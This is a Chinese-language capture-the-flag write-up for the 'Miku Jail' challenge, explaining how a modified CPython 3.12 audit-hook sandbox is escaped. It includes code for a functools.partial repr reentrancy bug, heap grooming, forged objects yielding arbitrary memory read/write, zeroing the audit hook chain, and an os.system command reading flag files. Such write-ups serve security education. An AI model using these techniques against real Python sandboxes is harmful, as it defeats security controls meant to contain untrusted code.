# Miku Jail

## 题目简述

题目运行一套定制 CPython 3.12。包装器先安装一个审计 hook：任何后续 audit event 都立即 `exit(0)`；同时给新线程设置会终止进程的 trace。用户代码被拼接到同一解释器中执行，正常 `import`、命令执行和常见逃逸路径都会触发审计。

仓库替换了三个 CPython 源文件。与官方 3.12 分支逐项对比可见：

- `bytearrayobject.c` 限制下标和值必须是精确内置类型，阻断借自定义 `__index__` 等方法重入的常见路径。
- `descrobject.c` 把 `mappingproxy` 比较改成对自身再次比较，会产生异常递归行为。
- `bufferedio.c` 注释掉三处 `PyMem_Free(self->buffer)`，使 I/O buffer 不被释放，改变并稳定堆分配状态。

官方解法不走语法黑名单，而是利用 `functools.partial` 在 `repr` 期间通过 `__setstate__` 替换参数元组，制造解释器级悬空引用，最终获得任意内存读写。

## 解题过程

### 在 `partial` 的 repr 中替换正在遍历的元组

创建：

```python
p = functools.partial(id)
p.__setstate__((id, (WeirdRepr(),) * 119, {}, {}))
repr(p)
```

`partial` 正在遍历旧参数元组并对元素调用 `repr`。第一个 `WeirdRepr.__repr__` 内部完成两件事：

1. 通过交替分配 tuple 和 bytearray 做 heap grooming，让一个较短 tuple 后面紧邻可写的 bytearray 数据。
2. 调用 `p.__setstate__((id, new_tuple, {}, {}))`，释放并替换当前仍被外层 repr 使用的旧参数区。

随后用 bytearray 覆盖越界遍历将要读取的槽位。外层 repr 继续把这些机器字当作 `PyObject *`，形成伪造对象引用。

### 伪造对象并取得超大 memoryview

求解器先按 CPython 对象布局准备一个伪 `bytearray`：

```python
fake_ba = memoryview(bytearray(bytearray.__basicsize__)).cast("P")
fake_ba[0] = 1
fake_ba[1] = address_of(bytearray)
fake_ba[2] = (2 ** (tuple.__itemsize__ * 8) - 1) // 2
```

再伪造一个带 `value` slot 的 `Fake` 实例，让该 slot 指向上述伪 bytearray。`Fake.__repr__` 不返回字符串，而是把 `memoryview(self.value)` 放进异常：

```python
class Fake:
    __slots__ = ["value"]

    def __repr__(self):
        raise Exception(memoryview(self.value))
```

通过把邻接 bytearray 填成伪 `Fake` 对象地址，悬空元组的越界 repr 最终调用 `Fake.__repr__`。外层捕获异常后便取得长度被伪造为极大值的可写 memoryview：

```python
try:
    repr(p)
except Exception as exc:
    mem = exc.args[0]
```

该 memoryview 相当于解释器地址空间上的任意读写 primitive。

### 清空审计 hook 链

不能直接 `import os`，因为审计 hook 会退出。官方脚本从现有对象 `sys.audit.__init__` 的 repr 中泄漏地址，沿对象内部指针读取运行时结构，再加上本题构建对应的固定偏移，定位全局 audit hook 链表头：

```python
audit_method = sys.audit.__init__
method_addr = parse_object_address(audit_method)

ptr = int.from_bytes(mem[method_addr + 24:method_addr + 32], "little")
ptr = int.from_bytes(mem[ptr + 24:ptr + 32], "little")
audit_head = ptr + 990456
mem[audit_head:audit_head + 8] = b"\x00" * 8
```

把链表头写零后，审计机制不再拦截危险操作：

```python
import os
os.system("cat /flag*.txt")
```

仓库中附件使用的 flag 为：

```text
SEKAI{time_to_make_it_57_https://www.youtube.com/watch?v=TXzfQ0cP1P0}
```

与 Hayabusa 类似，这里的 YouTube URL 属于 flag 内容本身，不是解题依赖的外链。

题面配图只是一条“Miku 被捕”的剧情推文，没有漏洞或取证信息，已转述为题目背景而不保留图片资源。

## 方法总结

- 核心技巧：在 CPython C 扩展对象的 repr 重入期间修改其内部状态，造成悬空 tuple 读取；借伪对象和伪 bytearray 把它升级为任意内存读写，再直接关闭审计 hook。
- 识别信号：pyjail 提供 `functools.partial.__setstate__`、自定义 `__repr__`、`memoryview`、对象地址泄漏和可预测的 CPython 对象布局，但所有高层危险行为都被 audit hook 阻断。
- 复用要点：这类解法强依赖 CPython 版本、allocator 状态和结构偏移；应把 heap grooming、伪对象布局与最终目标地址分别验证。拿到任意读写后，优先破坏统一的策略入口（如 audit hook 链），比逐个绕过受限 API 更稳定。
